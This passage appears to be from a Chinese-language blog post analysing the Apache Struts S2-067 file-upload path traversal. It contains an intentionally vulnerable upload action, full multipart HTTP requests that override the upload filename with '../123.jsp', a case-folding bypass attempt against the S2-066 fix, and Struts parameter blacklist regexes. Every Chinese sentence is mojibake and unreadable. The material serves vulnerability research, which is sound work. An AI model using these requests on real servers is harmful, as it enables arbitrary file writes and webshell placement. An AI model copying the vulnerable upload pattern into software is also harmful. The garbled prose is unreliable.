uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(File upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> path + File.separator + <span class="built_in">this</span>.uploadFileName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.upload, <span class="keyword">new</span> <span class="title class_">File</span>(realPath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®struts.xmlï¼Œé€šå¸¸åœ¨é¡¹ç›®è·¯å¾„çš„&#x2F;WEB-INF&#x2F;classesè·¯å¾„ä¸‹ï¼Œæ·»åŠ è¿™ä¸ªaction</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;s2067&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.ph0ebus.s2067.action.UploadAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doUpload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/sKTlkPfBRaXtrJo.png" alt="img"></p><p>web.xmlå½“ä¸­filteré…ç½®å¥½äº†ï¼Œå¯ä»¥ä¸ç”¨ä¿®æ”¹</p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="å•æ–‡ä»¶ä¸Šä¼ "><a href="#å•æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å•æ–‡ä»¶ä¸Šä¼ "></a>å•æ–‡ä»¶ä¸Šä¼ </h2><p><img src="https://s2.loli.net/2024/12/20/zJyYUdKAj3MfD4g.png" alt="img"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;top.UploadFileName&quot;; </span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/DKyedJnrTWZIU3S.png" alt="img"></p><h2 id="å¤šæ–‡ä»¶ä¸Šä¼ "><a href="#å¤šæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å¤šæ–‡ä»¶ä¸Šä¼ "></a>å¤šæ–‡ä»¶ä¸Šä¼ </h2><p><img src="https://s2.loli.net/2024/12/20/UaKH72jLFn8rv9u.png" alt="img"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067s.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryq0PW93h6lyBzjZNZ</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>138</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>:  <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;uploadFileName[0]&quot;;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/XI7hYi46bQBCP93.png" alt="img"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>å®˜æ–¹æ¼æ´é€šå‘Šï¼š<a href="https://cwiki.apache.org/confluence/display/WW/S2-067">https://cwiki.apache.org/confluence/display/WW/S2-067</a></p><blockquote><p>File upload logic is flawed, and allows an attacker to enable paths with traversals - similar problem as reported in <a href="https://cwiki.apache.org/confluence/display/WW/S2-066">S2-066</a></p></blockquote><p>ç”±æ­¤å¯è§ï¼Œå…ˆåˆ†æä¸€ä¸‹S2-066è¿™ä¸ªæ¼æ´â€¦</p><p>[<a href="https://blog.ph0ebus.cn/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]">https://blog.ph0ebus.cn/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]</a>(<a href="https://blog.ph0ebus.cn/2024/12/15/Apache">https://blog.ph0ebus.cn/2024/12/15/Apache</a> Struts S2-066 æ¼æ´åˆ†æ&#x2F;)</p><p>è€Œè¿™é‡Œçš„ä¿®å¤æ–¹æ¡ˆå°±æ˜¯ï¼Œ<code>org.apache.struts2.dispatcher.HttpParameters#appendAll</code>ä¸­æ·»åŠ å‚æ•°æ—¶ï¼Œå¿½ç•¥å¤§å°å†™éå†åˆ é™¤åŒåå‚æ•°å†åšæ·»åŠ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.remove(newParams.keySet());</span><br><span class="line">    <span class="built_in">this</span>.parameters.putAll(newParams);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">remove</span><span class="params">(Set&lt;String&gt; paramsToRemove)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(String paramName : paramsToRemove) &#123;</span><br><span class="line">        <span class="built_in">this</span>.parameters.entrySet().removeIf((p) -&gt; ((String)p.getKey()).equalsIgnoreCase(paramName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/VJLKN8hjubq9mfT.png" alt="img"></p><p>åœ¨<code>FileUploadInterceptor#intercept</code>å°†æ–‡ä»¶ä¸Šä¼ çš„å‚æ•°æ·»åŠ åˆ°å‚æ•°åˆ—è¡¨æ—¶ä¼šç”¨åˆ°<code>HttpParameters#appendAll</code>è¿™ä¸ªæ–¹æ³•ï¼Œäºæ˜¯åŸæœ¬åˆ©ç”¨ç®€å•çš„å¤§å°å†™è½¬æ¢çš„å‚æ•°è¦†ç›–æ–¹å¼ä¸å¯è¡Œ</p><p>åœ¨åˆ†æS2-066çš„æ—¶å€™ã€‚æˆ‘æ³¨æ„åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹ï¼Œåœ¨<code>ognl.OgnlRuntime#capitalizeBeanPropertyName</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">capitalizeBeanPropertyName</span><span class="params">(String propertyName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (propertyName.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName.toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;set&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;)&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;is&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">2</span>, <span class="number">3</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿›è¡Œäº†å¤§å†™çš„è½¬æ¢ï¼Œèƒ½è”æƒ³åˆ°éƒ¨åˆ†å­—ç¬¦å­˜åœ¨å¤§å°å†™è½¬æ¢çš„ç‰¹æ€§</p><p><a href="http://www.lvyyevd.cn/archives/java-yu-yan-zhong-da-xiao-xie-de-te-xing">http://www.lvyyevd.cn/archives/java-yu-yan-zhong-da-xiao-xie-de-te-xing</a></p><p>æ¯”å¦‚<code>Ä±</code>è½¬æ¢ä¸ºå¤§å†™å¯ä»¥å¾—åˆ°å­—æ¯<code>I</code>ï¼Œäºæ˜¯èƒ½æƒ³åˆ°ï¼Œå¦‚æœä¸Šä¼ çš„å‚æ•°<code>name</code>ç¬¬ä¸€ä¸ªå­—æ¯å°å†™<code>i</code>ï¼Œèƒ½å¦é€šè¿‡è¿™ä¸ªç‰¹æ€§ç»•è¿‡å‘¢ï¼Ÿè™½ç„¶å³ä½¿èƒ½ç»•è¿‡ä¹Ÿä¸å…·æœ‰é€šç”¨æ„ä¹‰ï¼Œä½†æ˜¯è¿˜æ˜¯è¯•äº†è¯•</p><p><img src="https://s2.loli.net/2024/12/20/8uoprG1MDevUBac.png" alt="img"></p><p>ç®€å•å†™ä¸€ä¸ªactionï¼Œè¿™é‡Œnameè®¾ä¸ºinterï¼Œç„¶åå‘åŒ…ï¼Œå°è¯•ç”¨<code>Ä±nterFileName</code>è¦†ç›–</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067test.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Inter&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Ä±nterFileName&quot;; </span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/AIxsSLzNOBv62Cu.png" alt="img"></p><p>ä¸å¹¸çš„æ˜¯ï¼Œè¿™æ ·è¿˜æ˜¯ä¼šè¢«<code>equalsIgnoreCase</code>æ–¹æ³•æ£€æµ‹åˆ°ç„¶åremoveæ‰æ¶æ„å‚æ•°ï¼Œçœ‹çœ‹è¿™ä¸ªæ–¹æ³•çš„å®ç°é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equalsIgnoreCase</span><span class="params">(String anotherString)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span> == anotherString) ? <span class="literal">true</span></span><br><span class="line">            : (anotherString != <span class="literal">null</span>)</span><br><span class="line">            &amp;&amp; (anotherString.value.length == value.length)</span><br><span class="line">            &amp;&amp; regionMatches(<span class="literal">true</span>, <span class="number">0</span>, anotherString, <span class="number">0</span>, value.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">regionMatches</span><span class="params">(<span class="type">boolean</span> ignoreCase, <span class="type">int</span> toffset,</span></span><br><span class="line"><span class="params">        String other, <span class="type">int</span> ooffset, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ta[] = value;</span><br><span class="line">    <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> toffset;</span><br><span class="line">    <span class="type">char</span> pa[] = other.value;</span><br><span class="line">    <span class="type">int</span> <span class="variable">po</span> <span class="operator">=</span> ooffset;</span><br><span class="line">    <span class="comment">// Note: toffset, ooffset, or len might be near -1&gt;&gt;&gt;1.</span></span><br><span class="line">    <span class="keyword">if</span> ((ooffset &lt; <span class="number">0</span>) || (toffset &lt; <span class="number">0</span>)</span><br><span class="line">            || (toffset &gt; (<span class="type">long</span>)value.length - len)</span><br><span class="line">            || (ooffset &gt; (<span class="type">long</span>)other.value.length - len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (len-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> ta[to++];</span><br><span class="line">        <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> pa[po++];</span><br><span class="line">        <span class="keyword">if</span> (c1 == c2) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ignoreCase) &#123;</span><br><span class="line">            <span class="comment">// If characters don&#x27;t match but case may be ignored,</span></span><br><span class="line">            <span class="comment">// try converting both characters to uppercase.</span></span><br><span class="line">            <span class="comment">// If the results match, then the comparison scan should</span></span><br><span class="line">            <span class="comment">// continue.</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">u1</span> <span class="operator">=</span> Character.toUpperCase(c1);</span><br><span class="line">            <span class="type">char</span> <span class="variable">u2</span> <span class="operator">=</span> Character.toUpperCase(c2);</span><br><span class="line">            <span class="keyword">if</span> (u1 == u2) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Unfortunately, conversion to uppercase does not work properly</span></span><br><span class="line">            <span class="comment">// for the Georgian alphabet, which has strange rules about case</span></span><br><span class="line">            <span class="comment">// conversion.  So we need to make one last check before</span></span><br><span class="line">            <span class="comment">// exiting.</span></span><br><span class="line">            <span class="keyword">if</span> (Character.toLowerCase(u1) == Character.toLowerCase(u2)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§è¿™é‡Œä¼šé€ä½æ¯”è¾ƒï¼Œè¦æ»¡è¶³ä¸¤ä¸ªå­—ç¬¦ï¼Œæœ¬èº«ç›¸ç­‰æˆ–åŒæ—¶è½¬å¤§å†™ç›¸ç­‰æˆ–åŒæ—¶è½¬å°å†™ç›¸ç­‰å°±ä¼šè¢«è®¤ä¸ºç›¸ç­‰ã€‚æ˜¾ç„¶ä»…ä»…æ˜¯åˆ©ç”¨ä¸Šé¢çš„ç‰¹æ€§ä¸è¶³ä»¥å®Œæˆè¿™ä¸ªå£®ä¸¾ã€‚</p><p>åé¢åœ¨åˆ†æçš„æ—¶å€™å‘ç°ï¼Œå³ä½¿å­˜åœ¨ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦æ°å¥½èƒ½æ»¡è¶³è‹›åˆ»çš„è¦æ±‚ä¹Ÿä¸èƒ½ç”¨äºpayload</p><p>å› ä¸ºåœ¨å‚æ•°è¢«putåˆ°<code>acceptableParameters</code>å‰ï¼Œä¼šè°ƒç”¨<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#isAcceptableParameter</code>è¿›è¡Œæ£€æŸ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">acceptableName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isIgnoredDMI(name)) &#123;</span><br><span class="line">        LOG.trace(<span class="string">&quot;DMI is enabled, ignoring DMI method: &#123;&#125;&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">accepted</span> <span class="operator">=</span> <span class="built_in">this</span>.isWithinLengthLimit(name) &amp;&amp; !<span class="built_in">this</span>.isExcluded(name) &amp;&amp; <span class="built_in">this</span>.isAccepted(name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.devMode &amp;&amp; accepted) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;Parameter [&#123;&#125;] was accepted and will be appended to action!&quot;</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> accepted;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡<code>isIgnoredDMI()</code>é»‘åå•æ£€æŸ¥ï¼Œæ­£åˆ™åŒ¹é…<code>^(action|method):.*</code>ï¼ŒåŒ¹é…ä¸åˆ°åˆ™elseé€»è¾‘éƒ¨åˆ†</p><p>ç„¶åé€šè¿‡é»‘åå•æ ¡éªŒå’Œç™½åå•æ ¡éªŒï¼ˆé•¿åº¦æ ¡éªŒåªä¼šwarningï¼Œæ— ä¼¤å¤§é›…ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">é»‘åå•æ­£åˆ™è¡¨è¾¾å¼1</span><br><span class="line">(^|\%\&#123;)((#?)(top(\.|\[&#x27;|\[&quot;)|\[\d\]\.)?)(dojo|struts|session|request|response|application|servlet(Request|Response|Context)|parameters|context|_memberAccess)(\.|\[).*</span><br><span class="line">é»‘åå•æ­£åˆ™è¡¨è¾¾å¼2</span><br><span class="line">.*(^|\.|\[|\&#x27;|&quot;|get)class(\(\.|\[|\&#x27;|&quot;).*</span><br><span class="line">ç™½åå•æ­£åˆ™è¡¨è¾¾å¼</span><br><span 